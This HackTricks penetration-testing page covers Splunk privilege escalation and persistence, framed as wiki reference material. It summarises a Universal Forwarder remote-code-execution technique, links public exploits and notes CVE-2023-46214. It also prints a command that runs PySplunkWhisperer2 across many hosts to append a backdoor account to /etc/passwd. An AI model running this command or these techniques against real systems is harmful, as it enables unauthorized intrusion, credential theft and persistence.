# Splunk LPE and Persistence

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

If **enumerating** a machine **internally** or **externally** you find **Splunk running** (port 8090), if you luckily know any **valid credentials** you can **abuse the Splunk service** to **execute a shell** as the user running Splunk. If root is running it, you can escalate privileges to root.

Also if you are **already root and the Splunk service is not listening only on localhost**, you can **steal** the **password** file **from** the Splunk service and **crack** the passwords, or **add new** credentials to it. And maintain persistence on the host.

In the first image below you can see how a Splunkd web page looks like.



## Splunk Universal Forwarder Agent Exploit Summary

For further details check the post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). This is just a sumary:

**Exploit Overview:**
An exploit targeting the Splunk Universal Forwarder Agent (UF) allows attackers with the agent password to execute arbitrary code on systems running the agent, potentially compromising an entire network.

**Key Points:**
- The UF agent does not validate incoming connections or the authenticity of code, making it vulnerable to unauthorized code execution.
- Common password acquisition methods include locating them in network directories, file shares, or internal documentation.
- Successful exploitation can lead to SYSTEM or root level access on compromised hosts, data exfiltration, and further network infiltration.

**Exploit Execution:**
1. Attacker obtains the UF agent password.
2. Utilizes the Splunk API to send commands or scripts to the agents.
3. Possible actions include file extraction, user account manipulation, and system compromise.

**Impact:**
- Full network compromise with SYSTEM/root level permissions on each host.
- Potential for disabling logging to evade detection.
- Installation of backdoors or ransomware.

**Example Command for Exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```

**Usable public exploits:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Abusing Splunk Queries

**For further details check the post [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

The **CVE-2023-46214** allowed to upload an arbitrary script to **`$SPLUNK_HOME/bin/scripts`** and then explained that using the search query **`|runshellscript script_name.sh`** it was possible to **execute** the **script** stored in there.


<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
